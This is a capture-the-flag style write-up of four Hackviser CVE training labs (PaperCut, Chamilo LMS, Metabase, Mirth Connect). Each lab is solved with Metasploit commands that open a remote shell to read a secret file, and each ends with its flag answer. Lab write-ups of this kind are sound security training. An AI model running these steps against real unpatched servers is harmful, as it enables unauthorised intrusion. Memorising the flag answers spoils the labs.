---
title: 'CVE 2023'
date: '2026-05-04'
excerpt: 'CVE-2023-27350, CVE-2023-34960, CVE-2023-38646, CVE-2023-43208'
prog: 'Hackviser CVE Labs  -  May 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2023</h1>
<div class="writeup-date">May 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h4 class="mb-2">1. PaperCut MF/NG Authentication Bypass to Remote Code Execution (CVE-2023-27350)</h4>
<p class="mb-3">PaperCut MF and NG are print management software used globally. A critical vulnerability (CVE-2023-27350) exists in PaperCut MF and NG versions 8.0.0 through 22.0.8. This flaw allows unauthenticated attackers to bypass authentication by accessing the SetupCompleted page, granting them full administrative access to the dashboard. Once access is gained, an attacker can exploit the "Printer Scripting" feature to execute arbitrary code via the built-in RhinoJS engine, allowing for full system compromise with the privileges of the PaperCut service. Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2023-27350</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-27350/cvelabs_cve-2023-27350_image1.png" alt="CVE-2023-27350 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code>, and read the contents of secret.txt.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-27350/cvelabs_cve-2023-27350_image2.png" alt="CVE-2023-27350 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Newton</p>
<br />

<h4 class="mb-2">2. Chamilo LMS Remote Code Execution (CVE-2023-34960)</h4>
<p class="mb-3">Chamilo LMS is an open-source learning management system. In versions prior to 1.11.26, a critical vulnerability (CVE-2023-34960) exists that allows unauthenticated Remote Code Execution. The vulnerability is caused by improper sanitization of user inputs in the API endpoints, which allows attackers to execute arbitrary shell commands directly on the server without needing to log in. Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2023-34960</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-34960/cvelabs_cve-2023-34960_image1.png" alt="CVE-2023-34960 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open and we run <code>shell</code> to open a command shell session then <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-34960/cvelabs_cve-2023-34960_image2.png" alt="CVE-2023-34960 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Titan</p>
<br />

<h4 class="mb-2">3. Metabase Pre-Auth Remote Code Execution (CVE-2023-38646)</h4>
<p class="mb-3">Metabase is a widely used open-source Business Intelligence (BI) tool that allows companies to visualize and analyze their data easily. This laboratory covers the critical CVE-2023-38646 vulnerability detected in Metabase versions prior to 0.46.6.1. The vulnerability stems from a flaw in the JDBC connection string handling within the setup process. Even if the setup is complete, the setup-token remains accessible and usable. Unauthenticated attackers can abuse this token to inject malicious parameters into the H2 database connection string, leading to Remote Code Execution (RCE) on the server without needing valid credentials. Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside?</p>
<p class="mb-3"><strong>Steps: </strong>First we use Metasploit via <code>msfconsole</code>. Run <code>search CVE-2023-38646</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-38646/cvelabs_cve-2023-38646_image1.png" alt="CVE-2023-38646 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Once the Command shell session opens, we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-38646/cvelabs_cve-2023-38646_image2.png" alt="CVE-2023-38646 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Pluto</p>
<br />

<h4 class="mb-2">4. Mirth Connect Unauthenticated Remote Code Execution (CVE-2023-43208)</h4>
<p class="mb-3">NextGen Mirth Connect is a widely used open-source integration engine for healthcare data. This laboratory demonstrates a critical Unauthenticated Remote Code Execution vulnerability (CVE-2023-43208) affecting versions prior to 4.4.1. The vulnerability arises from an unsafe handling of Java XStream deserialization within the extension update mechanism. An unauthenticated attacker can send a malicious XML payload to the API, enabling arbitrary command execution on the host system. Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the secret information inside? Note: The target system is capable of interpreting Unix/Bash commands. Please select your payload accordingly.</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2023-43208</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-43208/cvelabs_cve-2023-43208_image1.png" alt="CVE-2023-43208 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to be able to execute shell commands to read secret.txt.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2023/cve-2023-43208/cvelabs_cve-2023-43208_image2.png" alt="CVE-2023-43208 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Heart</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>